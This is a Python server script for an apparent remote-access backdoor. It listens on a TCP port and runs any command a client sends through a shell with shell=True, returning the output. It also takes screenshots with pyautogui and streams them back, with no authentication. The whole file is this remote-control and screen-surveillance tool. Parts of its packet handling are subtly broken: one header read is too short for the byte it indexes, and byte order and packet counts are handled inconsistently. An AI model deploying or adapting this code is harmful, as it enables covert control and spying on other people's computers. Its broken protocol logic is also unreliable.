import subprocess
import socket, sys
import struct, math
import pyautogui as py
import socket, io

PACKET_SIZE = 10000

# Creates and connects to a client socket
def connectSocket(HOST, PORT, debug: bool = False) -> socket:
    try:
        sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
        if debug: 
            print('[+] Server Started')
            print('[+] Listening For Client Connection...')
        sckt.bind((HOST, PORT)) # Bind the socket to an adress and a port
        sckt.listen(1) # Listen for incoming connections
        client, client_addr = sckt.accept() 
        if debug:
            print(f'[+] {client_addr} Client connected to the server')   
        return client
    except (Exception): 
        return

# Implementation of the send() function with the packet system
def sendPackets(sckt: socket, dataToSend: bytearray, typeOfRequest: int,  debug: bool):
    try:
        nOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
        bytesSent = 0

        # Loop through the packets
        for i in range(nOfPacketsToSend):
            packetLength = min(PACKET_SIZE, len(dataToSend)-bytesSent).to_bytes(4, "big")
            packetPackets = (nOfPacketsToSend-(i+1)).to_bytes(2, "big")
            packetTypeOfRequest = typeOfRequest.to_bytes(1, "big")
            packetPayload = dataToSend[i*PACKET_SIZE:(i*PACKET_SIZE)+min(PACKET_SIZE, len(dataToSend)-bytesSent)]
            packet = packetLength + packetPackets + packetTypeOfRequest + packetPayload
            bytesSent += min(PACKET_SIZE, len(dataToSend)-bytesSent)

            sckt.sendall(packet)
            if debug:
                print("[SENT] Header: packetLength", packetLength, " | nOfPacketsLeft ", packetPackets, " | typeOfRequest ", typeOfRequest)
    except (Exception):
        return

# A "safer" and more convinient implementation of the standard recv() function
def recvAll(sckt: socket, n: int) -> bytearray:
    try:
        payload = sckt.recv(n)
        while (len(payload) < n):
            payload += sckt.recv(n-len(payload))
        return payload
    except (Exception):
        return b'EXIT0x02'

#                                                                              number of packets left to receive
# Implementation of the recvAll() function packet system --> packetHeader: 0x0 0x0 0x0 0x0 | 0x0 0x0 | 0x0
#                                                                                 ^       |             ^
#                                                                                 |       |             |
#                                                                           packet length | type of request (0x63 "c", 0x73 "v")
def recvPackets(sckt: socket, debug: bool = False) -> bytearray:
    try:
        receivedData = b""
        packetHeader = recvAll(sckt, 7)

        packetLength = struct.unpack("i", packetHeader[:4])[0]
        packetPackets = packetHeader[4] + packetHeader[5]
        typeOfRequest = packetHeader[6]

        payload = recvAll(sckt, packetLength)
        receivedData += (payload)
        if debug:
            print("[RECEIVED] Header: packetLength: ", packetLength, " | nOfPacketsLeft ", packetPackets, " | typeOfRequest ", typeOfRequest, payload)

        # Check if an error occurred during the first packet fetching
        while packetPackets > 0:
            if not receivedData == b"EXIT0x02":
                packetHeader = recvAll(sckt, 6)

                packetLength = struct.unpack("i", packetHeader[:4])[0]
                packetPackets = packetHeader[4] + packetHeader[5]
                typeOfRequest = packetHeader[6]

                payload = recvAll(sckt, packetLength) 
                receivedData += (payload)
            else:
                return 0x00, b"EXIT0x02"
    
        return (packetHeader[6], receivedData)
    except:
        return 0x00, b"EXIT0x02"

# Main server function
def mainServer(HOST, PORT, debug: bool = False):
    # Create the server-client socket
    clientSocket = connectSocket(HOST, PORT, True)
    startedVideoShare = False

    while True:
        typeOfRequest, command = recvPackets(clientSocket, True)
        command = command.decode()
        # DEBUG
        if debug and not command == "":
            print("[DEBUG] Command: ", command, " typeOfRequest: ", typeOfRequest)

        # Check for errors / exit command
        if command == "EXIT0x01":
            sys.exit(0)
        if command == "EXIT0x02":
            startedVideoShare = False
            clientSocket = connectSocket(HOST, PORT, True)      

        # If the request is a string request (0x63 is "c" in ascii, it stands for char)
        if typeOfRequest == 0x63:

            # Run a command
            # NOTE:  The subprocess.run call should be deprecated and a suprocess.Popen should be used, still trying to figure it out
            output = subprocess.run(command, shell=True, capture_output=True)
            
            # If the commmand has no output
            if output.stdout == b"":
                sendPackets(clientSocket, b"No output!", 99, True)
            else:
                sendPackets(clientSocket, output.stdout, 99, True)

            # DEBUG
            if debug and not output.stdout == "":
                print("[DEBUG] String request output: ", output.stdout)

        # If the request is a video request (0x76 is "v" in ascii, it stands for video)
        if typeOfRequest == 0x76:

            # If the video request is a video start request
            if "start" in command and not startedVideoShare:
                startedVideoShare = True
                frame = py.screenshot() # Take a screenshot
                frameBytes = io.BytesIO()
                frame.save(frameBytes, format="PNG") # Convert it to a png file
                screenBuffer = frameBytes.getvalue()
                sendPackets(clientSocket, screenBuffer, 0x76, True) # Send the data through the network

            # If the video request if a video stop request
            if "stop" in command:
                startedVideoShare = False
                sendPackets(clientSocket, b"Video stream stopped!", 0x63, True)
                continue
            
            # If the video request is a video continue command
            if "continue" in command:
                frame = py.screenshot()
                frameBytes = io.BytesIO()
                frame.save(frameBytes, format="PNG")
                screenBuffer = frameBytes.getvalue()
                sendPackets(clientSocket, screenBuffer, 0x76, True)



